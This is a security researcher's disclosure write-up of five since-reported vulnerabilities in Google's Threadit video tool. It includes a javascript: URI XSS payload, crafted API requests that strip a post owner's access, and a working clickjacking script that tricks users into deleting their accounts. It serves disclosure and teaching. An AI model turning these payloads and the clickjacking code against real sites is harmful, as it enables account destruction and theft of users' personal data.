---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-09-07_5-different-vulnerabilities-in-googles-threadit.md
original_filename: 2021-09-07_5-different-vulnerabilities-in-googles-threadit.md
title: 5 Different Vulnerabilities in Google’s Threadit
category: documents
detected_topics:
- access-control
- xss
- clickjacking
- command-injection
- automation-abuse
- information-disclosure
tags:
- imported
- documents
- access-control
- xss
- clickjacking
- command-injection
- automation-abuse
- information-disclosure
language: en
raw_sha256: 6ea1b814c1d67edab67de53a91adaaf7e4e0ed80d9b6f13ddd28c5ecf700ea21
text_sha256: 087d2b2c8823efe10d1598bbfacc5402920ceb85c42a23f32a2b93cb952921bf
ingested_at: '2026-06-28T07:32:07Z'
sensitivity: unknown
redactions_applied: false
---

# 5 Different Vulnerabilities in Google’s Threadit

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-09-07_5-different-vulnerabilities-in-googles-threadit.md
- Source Type: markdown
- Detected Topics: access-control, xss, clickjacking, command-injection, automation-abuse, information-disclosure
- Ingested At: 2026-06-28T07:32:07Z
- Redactions Applied: False
- Raw SHA256: `6ea1b814c1d67edab67de53a91adaaf7e4e0ed80d9b6f13ddd28c5ecf700ea21`
- Text SHA256: `087d2b2c8823efe10d1598bbfacc5402920ceb85c42a23f32a2b93cb952921bf`


## Content

---
title: "5 Different Vulnerabilities in Google’s Threadit"
page_title: "5 different vulnerabilities in Google's Threadit - Web Security Blog"
url: "https://websecblog.com/vulns/google-threadit/"
final_url: "https://websecblog.com/vulns/google-threadit/"
authors: ["Thomas Orlita (@ThomasOrlita)"]
programs: ["Google"]
bugs: ["DOM XSS", "Clickjacking", "Privilege escalation", "Information disclosure"]
publication_date: "2021-09-07"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3337
---

# 5 different vulnerabilities in Google’s Threadit

[![](https://secure.gravatar.com/avatar/7f8a61ba947af5eb2a9b491c4dacb5f1b6952c86727d08f85d3b10e901d8e253?s=24&d=mm&r=g)](https://websecblog.com/author/admin/)by [Thomas Orlita](https://websecblog.com/author/admin/)[Vulnerabilities](https://websecblog.com/category/vulns/)[September 7, 2021June 11, 2026](https://websecblog.com/vulns/google-threadit/)

[Threadit](https://www.threadit.area120.com/) was an online tool that allowed users to record and share short video recordings. It was built by [Area 120](https://area120.google.com/), Google’s in-house program for experimental projects. It launched in March 2021 and has been discontinued in December 2022.

![Threadit's banner](https://websecblog.com/wp-content/uploads/image-1024x613.webp)Threadit’s banner

In this article, we will go over five different vulnerabilities in Threadit.

### Table of Contents

  1. DOM XSS with Clickjacking
  2. Removing the Post Owner from the ACL
  3. Click(jack) to Delete Your Account
  4. Getting Viewers of Public Posts
  5. Getting Info About the Logged-In User

* * *

## DOM XSS with Clickjacking

To reproduce this XSS, we will first create a blank Threadit post.

![Create a Threadit](https://websecblog.com/wp-content/uploads/image-1-1.webp)

In order to be able to publish the post, we will need to populate it with some content, such as a camera or screen recording.

![New Threadit form](https://websecblog.com/wp-content/uploads/image-6.webp)

After we click _Finish video_ , we can customize more options about the post. The only field that will interest us is _Link_.

![Share your video form](https://websecblog.com/wp-content/uploads/image-2.webp)

### Adding a link

Here we will specify a new link with a title and a valid URL. Entering an invalid value will display an error and won’t allow us to submit the form.

![Add new link](https://websecblog.com/wp-content/uploads/image-3.webp)

When we click _Publish_ , the following request is sent.
  
  
  PATCH /draft/{draftId}
  Host: api.threadit.app
  
  {
  "cta": [
  {
  "text":"Click here!!1",
  "url":"https://websecblog.com/"
  }
  ],
  "isCtaPresent":true
  }

We will intercept the request and replace the `url` field value with `javascript:alert(document.domain)`.

Now, if we open the published post, we can see the CTA link we have attached in the bottom right corner. It is pointing to the JavaScript URI that we have changed in the PATCH request.

![A video with a link pointing to "javascript:alert\(document.domain\)"](https://websecblog.com/wp-content/uploads/image-4.webp)

* * *

### Clicking the link

Once we click the link, a new `about:blank#blocked` tab opens instead of executing the JavaScript code.

![about:blank#blocked](https://websecblog.com/wp-content/uploads/image-5.webp)

This is because the `a` element has the `target` attribute set to `_blank`, which causes the link to open in a new tab. In Chromium-based browsers, the `javascript:` link won’t be executed. In Firefox, however, this works fine.

> Try to click the following `target="_blank"` JavaScript link to see how it behaves in your browser. 

To make sure the link works in both browsers, we need to force the link in Chromium-based browsers to open in the current tab instead.

Holding a modifier key while clicking on a link results in the link opening in a different way.

`CTRL` or `MIDDLE BUTTON`| Open in new tab  
---|---  
`SHIFT`| Open in new window  
`ALT`| Download (in Chromium)  
`CTRL` \+ `SHIFT` or `SHIFT` \+ `MIDDLE BUTTON`| Open in new tab and focus it  
Ways of opening a link while holding different modifier keys

`CTRL`-clicking the link in both Chromium-based browsers and in Firefox will cause the JavaScript code to execute.

Now, the attacker could share this Threadit post publicly, send it to the victim, and instruct them to click on the link while holding `CTRL`. But this would require an excessive amount of user interaction.

### Clickjacking

Instead, as `threadit.app` didn’t use to send the `X-Frame-Options` header, we were able to insert the Threadit post directly on our site.

> The `X-Frame-Options` HTTP response header can be used to indicate whether or not a browser should be allowed to render a page in a `<frame>`, `**< iframe>**`, `<embed>` or `<object>`. Sites can use this to avoid clickjacking attacks, by ensuring that their content is not embedded into other sites.
> 
> — [MDN web docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options)

Having an iframe on our site allows us to transform it using CSS. We can make it (practically) invisible while keeping it interactive by setting the `opacity` to `0.0000001`. Then we will transform the iframe element using CSS and with the help of JavaScript, position it so that the link in it will always stay under the mouse pointer.

We need the user to click anywhere on our page. If the user is using a Chromium-based browser, they also have to be holding one of the modifier keys. We can overlay the page with a decoy button on top of the page with a prompt saying to `CTRL`-click it.

Once the user clicks somewhere on our page, the JavaScript code from the link will execute without the user even knowing. 

### The fix

Fixing the XSS is pretty straightforward. We just need to make sure the link starts with `http://` or `https://`.

For the clickjacking part, adding the `X-Frame-Options: DENY` header to the HTTP response of the document will tell the browser to not allow any site to include it in an iframe.

![](https://websecblog.com/wp-content/uploads/image-8.webp)Response headers before 

![](https://websecblog.com/wp-content/uploads/image-7.webp)Response headers after

Timeline|  
---|---  
2021-05-02| Vulnerability reported  
2021-05-03| Priority changed to P2  
2021-05-04| Nice catch  
2021-05-06| Reward issued  
  
* * *

## Removing the Post Owner from the ACL

This vulnerability allowed an attacker to remove the owner from any Threadit post.

### Creating and Sharing a New Threadit Post

The victim creates a new post on Threadit and shares it either as Public or with specific people by entering their email addresses.

![Sharing a Threadit post with the Public](https://websecblog.com/wp-content/uploads/image-9.webp)

Once the post is publicly shared, the attacker can access it. If the attacker was added to the list of viewers directly by email, the attacker will see a share UI in the top right. If, however, the post is shared publicly via a link, the share UI won’t be shown.

![Post without Share UI](https://websecblog.com/wp-content/uploads/image-11.webp)Public post

![Post with Share UI](https://websecblog.com/wp-content/uploads/image-12.webp)Directly shared post

The share UI being hidden in case of visiting a public post is reflected only on the frontend. No check is done on the backend and the API works the same with both posts.

### Updating the ACL

When the attacker makes changes in the share dialog, a PATCH request with two JSON fields is sent.
  
  
  PATCH /x/thread/{threadId}/acl
  Host: api.threadit.app
  
  {
  "remove":[
  
  ],
  "add":[
  {
  "role":[
  "ROLE_READ"
  ],
  "email":"user@example.com"
  }
  ]
  }

The `remove` and `add` fields are arrays of objects with the user’s email and a role to be removed or added, respectively.

![Share with people dialog](https://websecblog.com/wp-content/uploads/share-with-people-light-4.webp) ![Share with people dialog](https://websecblog.com/wp-content/uploads/share-with-people-dark-2.webp)

Trying to remove the owner from the access control list (ACL) using the following request will result in an error.
  
  
  {
  "remove":[
  {
  "role":[
  "ROLE_OWNER"
  ],
  "email":"example@gmail.com"
  }
  ]
  }
  
  
  Owner [example@gmail.com] cannot be removed from thread

The attacker can, however, add new users as viewers and afterward remove the users they have added.

This request will add a new user to the ACL.
  
  
  {
  "add":[
  {
  "role":[
  "ROLE_READ"
  ],
  "email":"user@example.com"
  }
  ]
  }

![New user in the ACL list](https://websecblog.com/wp-content/uploads/image-17.webp)

After the user has been added, the attacker subsequently deletes the user, leaving the ACL in the same state as it was before the attacker initially added the user.
  
  
  {
  "remove":[
  {
  "role":[
  "ROLE_READ"
  ],
  "email":"user@example.com"
  }
  ]
  }

From this, we have observed that the attacker, who is only a viewer of the post, can add any user as a viewer of the post. The attacker can also remove the same users they have previously added.

Now, what happens if the attacker tries to add the owner as a viewer?
  
  
  {
  "add":[
  {
  "role":[
  "ROLE_READ"
  ],
  "email":"example@gmail.com"
  }
  ]
  }

The owner’s role (`ROLE_OWNER`) gets downgraded to `ROLE_READ`.
  
  
  {
  "addResult":[
  // items that were changed
  {
  "acl":{
  "role":"ROLE_READ",
  "email":"example@gmail.com"
  },
  "status":"STATUS_OK"
  }
  ],
  "acl":[
  // current ACL list
  { 
  // permission allowing the public to view the post
  "scope":{
  "public":{
  "isPresent":true
  }
  },
  "role":[
  "ROLE_READ"
  ]
  },
  {
  // permission of the owner is set as ROLE_READ
  "scope":{
  "user":{
  "name":"Victim User",
  "email":"example@gmail.com"
  }
  },
  "role":[
  "ROLE_READ"
  ]
  }
  ]
  }

The attacker has successfully changed the post owner’s role from owner to viewer.

The post owner can still access the post, but some UI features are disabled.

Users who add viewers to a post can also remove them. Since the owner is now a viewer, the attacker can remove the owner from the ACL and also remove the public view permission.
  
  
  {
  "remove":[
  {
  "role":[
  "ROLE_READ"
  ],
  "email":"example@gmail.com"
  },
  {
  "public":{
  "isPresent":true
  },
  "role":[
  "ROLE_READ"
  ]
  }
  ]
  }

Once the owner opens their post, they will be presented with the following message.

![A warning message: "You do not have access to this thread. Please ask the owner to share it with you."](https://websecblog.com/wp-content/uploads/image-16-1.webp)

The attack scenario is:

> Anyone who can view any post can remove the owner from the ACL. The owner won’t be able to access their post anymore.

### The fix

Now, trying to update the owner’s role will result in the following error: _Owner scope cannot be updated_.

Timeline|  
---|---  
2021-07-08| Vulnerability reported  
2021-07-08| Identified as Abuse Risk  
2021-07-09| Accepted  
2021-07-20| Reward issued  
  
* * *

## Click(jack) to Delete Your Account

By clicking the profile avatar in the top right of the website, we are able to configure our profile settings.

![Threadit home page](https://websecblog.com/wp-content/uploads/image-18.webp)

This navigates us to the profile page at `https://threadit.app/profile`, with the _Profile_ , _Notifications_ , and _Account_ tabs.

![](https://websecblog.com/wp-content/uploads/image-61.png)

The only option in the _Profile_ tab is to log out.

### Delete Account

If we switch to the _Account_ tab, we can see a _Delete Account_ button. 

![Delete account form](https://websecblog.com/wp-content/uploads/image-21.webp)

Clicking _Delete Account_ opens a confirmation prompt with the _Cancel_ and _Delete_ buttons.

![Delete account confirmation](https://websecblog.com/wp-content/uploads/threadit-delete-acc-light.webp) ![Delete account confirmation](https://websecblog.com/wp-content/uploads/threadit-delete-acc-dark.webp)

### Clickjacking

As we learned in the previous XSS clickjacking section, threadit.app didn’t use to protect itself against clickjacking attacks.

This allowed us to insert an iframe of `https://threadit.app/profile` on our website. Similar to the XSS clickjacking, we can position and hide the iframe. Unlike the XSS clickjacking, where we needed the user to only click once in a single place, we will need to navigate the user through the profile page and update the iframe accordingly after each click. 

As navigating the tabs in the profile section doesn’t update the URL, we first need the victim to click on the _Account_ tab. After that, we will reposition the iframe to the position of the _Delete Account_ button, and then the final _Delete_ button.

To detect a click in the iframe, we will wait until the current window loses focus by listening for the `blur` event. Then we will check if the currently focused element (`document.activeElement`) is equal to the iframe. If so, we can assume that the iframe was focused as a result of the user clicking in it. This won’t always be accurate as the iframe can get focused using a different way, but it works well enough for the demo.
  
  
  const iframe = document.querySelector('iframe');
  
  let step = 0;
  
  // define coordinates on the page we want the user to click on
  const steps = [
  {
  x: 321,
  y: 120
  },
  {
  x: 105,
  y: 300
  },
  {
  x: 406,
  y: 296
  }
  ];
  
  // reposition the iframe to the current step coordinates
  const updatePosition = () => {
  if (!steps[step]) return;
  iframe.style.left = -steps[step].x;
  iframe.style.top = -steps[step].y;
  };
  
  // update the iframe to the initial position
  updatePosition();
  
  // make sure the window is focused, so we can detect a blur event
  window.focus();
  
  // listen for events when the current window loses focus
  window.addEventListener('blur', () => {
  // the currently focused element is the iframe,
  // meaning that the user probably clicked in it
  if (document.activeElement === iframe) {
  step++;
  console.log('step ' + step);
  
  // unfocus the iframe so we can detect the next click
  setTimeout(() => {
  document.activeElement.blur();
  updatePosition();
  }, 10);
  }
  });

The video below illustrates how the clickjacking attack works. Normally, the overlay of the iframe would be hidden. The iframe is zoomed-in to make it easier to click in it. After each click, the iframe gets repositioned according to the `steps` coordinates. 

Check out the [demo page and its source code](https://samples.websec.blog/threadit-delete-account-clickjacking/).

This leaves us with the following attack scenario:

> The attacker can embed an iframe pointing to the account page and position it so that when the user clicks on the page, the **Delete account** button in the iframe will be clicked instead.  
> The victim’s Threadit account that they are currently logged into will be deleted without their knowledge.

Timeline|  
---|---  
2021-07-08| Vulnerability reported  
2021-07-08| Priority changed to P2  
2021-07-08| Nice catch  
2021-07-20| Reward issued  
  
* * *

## Getting Viewers of Public Posts

This vulnerability allowed unauthorized users to access the list of viewers on a public post.

> The list of Viewers is visible to anyone who has been directly added to the permissions on the Threadit via email address (i.e. Owner, Reply, or View access). Anyone viewing a Theadit via anonymous public access cannot see the list of Viewers.
> 
> Threadit Support

When an author or someone added by an email address to a Threadit post views the post, there will be an _eye_ icon in the UI with the list of users who viewed the post.

![List of viewers](https://websecblog.com/wp-content/uploads/image-23.webp)

When someone who was not added to this post directly, but opened it via a link, views the post, the _eye_ icon to show the list of viewers will not be shown.

![Post without the list of viewers in the UI](https://websecblog.com/wp-content/uploads/image-25.webp)

The following request is sent once the author opens the post.
  
  
  GET /message/{messageId}
  Host: api.threadit.app
  
  
  
  {
  ...
  "viewer":[
  {
  "user":{
  "name":"Thomas Orlita",
  "email":"info@thomasorlita.com"
  },
  "viewCount":1,
  "lastViewedTime":"2021-03-20T17:49:39.668Z"
  },
  {
  "user":{
  "name":"Anonymous"
  },
  "viewCount":10,
  "lastViewedTime":"2021-08-13T16:44:16.864Z"
  },
  {
  "user":{
  "name":"Example User",
  "email":"user@example.com"
  },
  "viewCount":4,
  "lastViewedTime":"2021-07-30T17:49:08.111Z"
  },
  {
  "user":{
  "name":"Another User",
  "email":"another@user.example"
  },
  "viewCount":1,
  "lastViewedTime":"2021-03-17T15:53:01.469Z"
  }
  ]
  }

One of the fields in the response, `viewer`, contains the list of all users who viewed this post. Users who were not logged in are shown as `Anonymous`.

When a user who shouldn’t be able to see the list of viewers opens the post, the same `GET` request is sent. However, the response with the list of viewers is identical to the one sent to the author. This means that the list of viewers is sent to everyone, regardless if they should see it.

Attack scenario:

> A user who was not directly added to a public post with the Owner/Reply/View permission can still get the list of viewers (name, email, profile picture). Only users with the appropriate permission should be able to do so.

Timeline|  
---|---  
2021-07-07| Vulnerability reported  
2021-07-08| Identified as Abuse Risk  
2021-07-09| Priority changed to P3  
2021-07-15| Closed as Won’t Fix  
2021-07-19| Added more info  
2021-08-04| Nice catch  
2021-08-10| Reward issued  
  
* * *

## Getting Info About the Logged-In User

As we know, the author can see the list of users who viewed the post.

We can get the email address of the victim just by navigating them to our post. Even better, we can embed an invisible iframe of the post on our site. When the victim opens our site, our Threadit post gets quietly loaded in the background without them knowing. If the victim is logged in Threadit, their email address will be added to the list of viewers we can access.

Once the victim’s browser has loaded the iframe, we can fetch the list of viewers of the post and get the latest viewer.
  
  
  {
  "name": "Thomas Orlita",
  "email": "info@thomasorlita.com",
  "profileImageUrl": "https://lh3.googleusercontent.com/a-/AOh14GjvK1Kv58P5EzvedgZDkNZVXHR-69p3Urs5INck1gA=s96-c"
  }

Unfortunately, this bug was marked as _Intended behavior_. Later, the `X-Frame-Options` header was added, so iframing the site is not possible anymore. This could still be replicated by opening a new tab instead, but now it’d be visible to the victim.

The attack scenario for this report was:

> Assuming the victim is logged in Threadit, the attacker gets the victim’s personal information once they open the attacker’s website.  
> This could be also used for harvesting visitors’ data in the background.

Timeline|  
---|---  
2021-07-03| Vulnerability reported  
2021-07-05| Closed as Won’t Fix  
  
* * *

This is all from vulnerabilities on Threadit’s site. The Threadit team confirmed that none of them were abused.

But, there is also the Threadit Chrome Extension. The Chrome Extension, used for integrating Threadit with other sites on the web, Gmail being one of them, was vulnerable to an XSS attack. This allowed executing a DOM XSS in Gmail via `postMessage` if the user has installed the extension.  
  
More about this in an upcoming article!

* * *

Written by [Thomas Orlita](https://thomasorlita.com/)
